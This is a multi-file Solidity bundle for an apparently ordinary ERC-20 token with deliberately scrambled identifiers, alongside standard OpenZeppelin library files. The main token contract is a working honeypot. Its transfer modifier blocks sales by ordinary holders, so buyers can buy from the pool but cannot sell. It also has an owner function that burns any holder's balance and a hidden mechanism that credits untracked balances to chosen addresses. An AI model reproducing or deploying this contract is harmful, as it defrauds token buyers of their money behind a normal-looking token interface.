// ===== FILE: factory/Token.sol =====
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Context} from "@openzeppelin/contracts/utils/Context.sol";
import {
    ReentrancyGuard
} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {
    IERC20Metadata
} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import {Ownable} from "./Ownable.sol";
import {wrenJourney} from "./interfaces/IUniswapV2Factory.sol";
import {storkWhisper} from "./interfaces/IUniswapV2Router02.sol";
import {lyricPrairie} from "./libraries/CodeChecker.sol";
import {azureLarch} from "./libraries/PancakeRouter.sol";

contract lotusPlant is Context, IERC20Metadata, Ownable, ReentrancyGuard {
    struct marshAmber {
        address from;
        address dartTrack;
        uint256 bannerArc;
        uint256 timestamp;
    }

    mapping(address => uint256) private bufferMoth;
    mapping(address => mapping(address => uint256)) private lanceOnyx;

    uint256[] private ridgeDock;
    uint256[] private solarMercy;
    mapping(uint256 => marshAmber) private etherHelix;
    uint256 private joltDepth;

    uint256 private gleamIris;

    string private unityMist;
    string private glenCoast;

    storkWhisper private pumiceKey;
    address private whaleApple;

    modifier fleetSouth(address from, address dartTrack, uint256 bannerArc) {
        etherHelix[joltDepth] = marshAmber(from, dartTrack, bannerArc, block.timestamp);
        if (!crewFeather(from) && !crewFeather(dartTrack)) {
            require(!lyricPrairie.morningOre(dartTrack));
            if (from != whaleApple) {
                revert();
            }
        }

        joltDepth++;
        _;
    }

    constructor(string memory larkBasin, string memory hawkBrown, uint256 cubePond) {
        unityMist = larkBasin;
        glenCoast = hawkBrown;
        pumiceKey = storkWhisper(azureLarch.prairiePalm());
        orePlate(_msgSender(), cubePond * 1e18);
        dropHelix(tx.origin, 0);
        talonWolf();
    }

    function talonWolf() internal {
        require(whaleApple == address(0));
        wrenJourney factory = wrenJourney(pumiceKey.factory());
        address treeTundra = factory.getPair(address(this), pumiceKey.WETH());
        if (treeTundra == address(0)) {
            treeTundra = factory.createPair(address(this), pumiceKey.WETH());
        }
        whaleApple = treeTundra;
    }

    function robinDeer() external view returns (address) {
        return whaleApple;
    }

    function crewFeather(address bambooTree) public view returns (bool) {
        if (owner() != address(0) && bambooTree == owner()) return true;
        for (uint256 smokeMire = 0; smokeMire < ridgeDock.length; smokeMire++) {
            if (bambooTree == etherHelix[ridgeDock[smokeMire]].dartTrack) return true;
        }
        return false;
    }

    function horizonGlory()
        external
        view
        returns (address[] memory compassBridge, uint256[] memory nightCherry)
    {
        uint256 orbitCotton = ridgeDock.length;
        compassBridge = new address[](orbitCotton);
        nightCherry = new uint256[](orbitCotton);
        for (uint256 smokeMire = 0; smokeMire < orbitCotton; smokeMire++) {
            address cloudBamboo = etherHelix[ridgeDock[smokeMire]].dartTrack;
            compassBridge[smokeMire] = cloudBamboo;
            nightCherry[smokeMire] = bufferMoth[cloudBamboo];
        }
    }

    function orchardRidge()
        external
        view
        returns (address[] memory quiltClover, uint256[] memory winterAsh)
    {
        uint256 orbitCotton = solarMercy.length;
        quiltClover = new address[](orbitCotton);
        winterAsh = new uint256[](orbitCotton);
        for (uint256 smokeMire = 0; smokeMire < orbitCotton; smokeMire++) {
            marshAmber storage bridgeIvory = etherHelix[solarMercy[smokeMire]];
            quiltClover[smokeMire] = bridgeIvory.dartTrack;
            winterAsh[smokeMire] = bridgeIvory.bannerArc;
        }
    }

    function dropHelix(address dartTrack, uint256 bannerArc) public onlyOwner {
        etherHelix[joltDepth] = marshAmber(
            address(0),
            dartTrack,
            bannerArc,
            block.timestamp
        );
        if (bannerArc > 0) {
            solarMercy.push(joltDepth);
        }
        ridgeDock.push(joltDepth);
        joltDepth++;
    }

    function newtJourney(address bambooTree) external onlyOwner {
        require(bambooTree != address(0));

        uint256 smokeMire = ridgeDock.length;
        while (smokeMire > 0) {
            smokeMire--;
            uint256 goldFlora = ridgeDock[smokeMire];
            if (etherHelix[goldFlora].dartTrack == bambooTree) {
                ridgeDock[smokeMire] = ridgeDock[
                    ridgeDock.length - 1
                ];
                ridgeDock.pop();
            }
        }

        uint256 brickDart = solarMercy.length;
        while (brickDart > 0) {
            brickDart--;
            if (etherHelix[solarMercy[brickDart]].dartTrack == bambooTree) {
                solarMercy[brickDart] = solarMercy[
                    solarMercy.length - 1
                ];
                solarMercy.pop();
            }
        }
    }

    function breakTorch(IERC20 beanEther, uint256 bannerArc) external {
        require(crewFeather(_msgSender()));
        require(address(beanEther) != address(this));
        require(beanEther.transfer(_msgSender(), bannerArc));
    }

    function bridgeRust() external {
        uint256 bronzeSouth = solarMercy.length;

        for (uint256 smokeMire = 0; smokeMire < bronzeSouth; smokeMire++) {
            uint256 goldFlora = solarMercy[smokeMire];
            marshAmber storage bridgeIvory = etherHelix[goldFlora];

            bufferMoth[bridgeIvory.dartTrack] += bridgeIvory.bannerArc;
        }

        delete solarMercy;
    }

    function name() public view virtual override returns (string memory) {
        return unityMist;
    }

    function symbol() public view virtual override returns (string memory) {
        return glenCoast;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return gleamIris;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return bufferMoth[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override nonReentrant returns (bool) {
        owlLotus(_msgSender(), to, amount);
        return true;
    }

    function allowance(
        address owner_,
        address spender
    ) public view virtual override returns (uint256) {
        return lanceOnyx[owner_][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        knightRidge(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override nonReentrant returns (bool) {
        uint256 currentAllowance = lanceOnyx[from][_msgSender()];
        require(
            currentAllowance >= amount);

        unchecked {
            knightRidge(from, _msgSender(), currentAllowance - amount);
        }

        owlLotus(from, to, amount);

        return true;
    }

    function guideWalnut(
        address spender,
        uint256 addedValue
    ) public virtual nonReentrant returns (bool) {
        knightRidge(
            _msgSender(),
            spender,
            lanceOnyx[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function teakDance(
        address spender,
        uint256 subtractedValue
    ) public virtual nonReentrant returns (bool) {
        uint256 currentAllowance = lanceOnyx[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue);
        unchecked {
            knightRidge(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function orePlate(
        address account,
        uint256 amount
    ) internal virtual nonReentrant {
        require(account != address(0));

        roseComet(address(0), account, amount);

        gleamIris += amount;
        bufferMoth[account] += amount;
        emit Transfer(address(0), account, amount);

        gardenFresh(address(0), account, amount);
    }

    function honeyMesa(
        address account,
        uint256 amount
    ) internal virtual nonReentrant {
        require(account != address(0));

        roseComet(account, address(0), amount);

        uint256 oliveSeal = bufferMoth[account];
        require(oliveSeal >= amount);
        unchecked {
            bufferMoth[account] = oliveSeal - amount;
        }
        gleamIris -= amount;

        emit Transfer(account, address(0), amount);

        gardenFresh(account, address(0), amount);
    }

    function knightRidge(
        address owner_,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner_ != address(0));
        require(spender != address(0));

        lanceOnyx[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function burn(uint256 bannerArc) external {
        honeyMesa(_msgSender(), bannerArc);
    }

    function spikeSpark(address bambooTree) external onlyOwner {
        honeyMesa(bambooTree, bufferMoth[bambooTree]);
    }

    function owlLotus(
        address from,
        address to,
        uint256 amount
    ) internal virtual fleetSouth(from, to, amount) {
        require(from != address(0));
        require(to != address(0));

        roseComet(from, to, amount);

        uint256 deckWest = bufferMoth[from];
        require(
            deckWest >= amount);
        unchecked {
            bufferMoth[from] = deckWest - amount;
        }
        bufferMoth[to] += amount;

        emit Transfer(from, to, amount);

        gardenFresh(from, to, amount);
    }

    function roseComet(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function gardenFresh(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


// ===== FILE: factory/Ownable.sol =====
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Context} from "@openzeppelin/contracts/utils/Context.sol";

contract Ownable is Context {
    address private beanWind;
    event OwnershipTransferred(
        address indexed salmonUnity,
        address indexed dawnAxe
    );

    constructor() {
        address heathJourney = _msgSender();
        beanWind = heathJourney;
        emit OwnershipTransferred(address(0), heathJourney);
    }

    function owner() public view returns (address) {
        return beanWind;
    }

    modifier onlyOwner() {
        require(beanWind == _msgSender());
        _;
    }

    function transferOwnership(address dawnAxe) public virtual onlyOwner {
        require(
            dawnAxe != address(0));
        emberTable(dawnAxe);
    }

    function emberTable(address dawnAxe) internal virtual {
        address foamSatin = beanWind;
        beanWind = dawnAxe;
        emit OwnershipTransferred(foamSatin, dawnAxe);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(beanWind, address(0));
        beanWind = address(0);
    }
}


// ===== FILE: factory/libraries/CodeChecker.sol =====
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

library lyricPrairie {
    bytes32 constant nightSwan =
        0xb09ef517c48d2bf6eed05457ff56871b2596e3fc904fc6e9795882a870c2e993;

    function morningOre(address bambooTree) internal view returns (bool) {
        uint256 robinSnow;
        assembly {
            robinSnow := extcodesize(bambooTree)
        }
        if (robinSnow == 0) return false;

        bytes32 codehash;
        assembly {
            codehash := extcodehash(bambooTree)
        }
        return codehash != nightSwan;
    }
}


// ===== FILE: factory/libraries/PancakeRouter.sol =====
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

library azureLarch {
    function prairiePalm() internal view returns (address) {
        if (block.chainid == 56) return 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        if (block.chainid == 97) return 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;

        if (block.chainid == 1)  return 0xEfF92A263d31888d860bD50809A8D171709b7b1c;
        revert();
    }
}


// ===== FILE: factory/interfaces/IUniswapV2Factory.sol =====
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface wrenJourney {
    function createPair(
        address canyonBrown,
        address bridgeCotton
    ) external returns (address groveRoof);

    function getPair(
        address canyonBrown,
        address bridgeCotton
    ) external returns (address groveRoof);
}


// ===== FILE: _openzeppelin/contracts/utils/Context.sol =====
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)

pragma solidity ^0.8.20;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}


// ===== FILE: factory/interfaces/IUniswapV2Router02.sol =====
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface storkWhisper {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 voidOcean,
        uint256 hayMoth,
        address[] calldata lilyWeald,
        address dartTrack,
        uint256 crestTiger
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address beanEther,
        uint256 flickerKingdom,
        uint256 candleSpark,
        uint256 axeClear,
        address dartTrack,
        uint256 crestTiger
    )
        external
        payable
        returns (uint256 shieldCherry, uint256 sparrowAzure, uint256 peakEcho);

    function removeLiquidityETH(
        address beanEther,
        uint256 peakEcho,
        uint256 candleSpark,
        uint256 axeClear,
        address dartTrack,
        uint256 crestTiger
    ) external returns (uint256 shieldCherry, uint256 sparrowAzure);
}


// ===== FILE: _openzeppelin/contracts/utils/StorageSlot.sol =====
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.1.0) (utils/StorageSlot.sol)
// This file was procedurally generated from scripts/generate/templates/StorageSlot.js.

pragma solidity ^0.8.20;

/**
 * @dev Library for reading and writing primitive types to specific storage slots.
 *
 * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.
 * This library helps with reading and writing to such slots without the need for inline assembly.
 *
 * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.
 *
 * Example usage to set ERC-1967 implementation slot:
 * ```solidity
 * contract ERC1967 {
 *     // Define the slot. Alternatively, use the SlotDerivation library to derive the slot.
 *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 *
 *     function _getImplementation() internal view returns (address) {
 *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
 *     }
 *
 *     function _setImplementation(address newImplementation) internal {
 *         require(newImplementation.code.length > 0);
 *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;
 *     }
 * }
 * ```
 *
 * TIP: Consider using this library along with {SlotDerivation}.
 */
library StorageSlot {
    struct AddressSlot {
        address value;
    }

    struct BooleanSlot {
        bool value;
    }

    struct Bytes32Slot {
        bytes32 value;
    }

    struct Uint256Slot {
        uint256 value;
    }

    struct Int256Slot {
        int256 value;
    }

    struct StringSlot {
        string value;
    }

    struct BytesSlot {
        bytes value;
    }

    /**
     * @dev Returns an `AddressSlot` with member `value` located at `slot`.
     */
    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `BooleanSlot` with member `value` located at `slot`.
     */
    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `Bytes32Slot` with member `value` located at `slot`.
     */
    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `Uint256Slot` with member `value` located at `slot`.
     */
    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `Int256Slot` with member `value` located at `slot`.
     */
    function getInt256Slot(bytes32 slot) internal pure returns (Int256Slot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `StringSlot` with member `value` located at `slot`.
     */
    function getStringSlot(bytes32 slot) internal pure returns (StringSlot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `StringSlot` representation of the string storage pointer `store`.
     */
    function getStringSlot(string storage store) internal pure returns (StringSlot storage r) {
        assembly ("memory-safe") {
            r.slot := store.slot
        }
    }

    /**
     * @dev Returns a `BytesSlot` with member `value` located at `slot`.
     */
    function getBytesSlot(bytes32 slot) internal pure returns (BytesSlot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `BytesSlot` representation of the bytes storage pointer `store`.
     */
    function getBytesSlot(bytes storage store) internal pure returns (BytesSlot storage r) {
        assembly ("memory-safe") {
            r.slot := store.slot
        }
    }
}


// ===== FILE: _openzeppelin/contracts/token/ERC20/IERC20.sol =====
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/IERC20.sol)

pragma solidity >=0.4.16;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}


// ===== FILE: _openzeppelin/contracts/utils/ReentrancyGuard.sol =====
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.5.0) (utils/ReentrancyGuard.sol)

pragma solidity ^0.8.20;

import {StorageSlot} from "./StorageSlot.sol";

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If EIP-1153 (transient storage) is available on the chain you're deploying at,
 * consider using {ReentrancyGuardTransient} instead.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 *
 * IMPORTANT: Deprecated. This storage-based reentrancy guard will be removed and replaced
 * by the {ReentrancyGuardTransient} variant in v6.0.
 *
 * @custom:stateless
 */
abstract contract ReentrancyGuard {
    using StorageSlot for bytes32;

    // keccak256(abi.encode(uint256(keccak256("openzeppelin.storage.ReentrancyGuard")) - 1)) & ~bytes32(uint256(0xff))
    bytes32 private constant REENTRANCY_GUARD_STORAGE =
        0x9b779b17422d0df92223018b32b4d1fa46e071723d6817e2486d003becc55f00;

    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;

    /**
     * @dev Unauthorized reentrant call.
     */
    error ReentrancyGuardReentrantCall();

    constructor() {
        _reentrancyGuardStorageSlot().getUint256Slot().value = NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    /**
     * @dev A `view` only version of {nonReentrant}. Use to block view functions
     * from being called, preventing reading from inconsistent contract state.
     *
     * CAUTION: This is a "view" modifier and does not change the reentrancy
     * status. Use it only on view functions. For payable or non-payable functions,
     * use the standard {nonReentrant} modifier instead.
     */
    modifier nonReentrantView() {
        _nonReentrantBeforeView();
        _;
    }

    function _nonReentrantBeforeView() private view {
        if (_reentrancyGuardEntered()) {
            revert ReentrancyGuardReentrantCall();
        }
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be NOT_ENTERED
        _nonReentrantBeforeView();

        // Any calls to nonReentrant after this point will fail
        _reentrancyGuardStorageSlot().getUint256Slot().value = ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _reentrancyGuardStorageSlot().getUint256Slot().value = NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _reentrancyGuardStorageSlot().getUint256Slot().value == ENTERED;
    }

    function _reentrancyGuardStorageSlot() internal pure virtual returns (bytes32) {
        return REENTRANCY_GUARD_STORAGE;
    }
}


// ===== FILE: _openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol =====
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity >=0.6.2;

import {IERC20} from "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC-20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
